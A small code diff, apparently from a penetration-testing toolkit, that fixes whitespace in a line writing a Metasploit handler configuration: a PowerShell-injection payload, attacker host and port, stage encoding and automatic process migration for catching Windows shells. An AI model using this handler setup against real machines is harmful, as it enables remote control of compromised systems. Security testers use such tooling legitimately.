@@ -112,7 +112,7 @@ if multi_injection == "on":
                     filewrite.write("\nuse exploit/multi/handler\n")
                     if auto_migrate == "ON":
                         filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
-                    filewrite.write("set PAYLOAD %s\n set LHOST %s\nset EnableStageEncoding true\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, ports))
+                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding true\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, ports))
                     filewrite.close()
 
 # if its turned to off
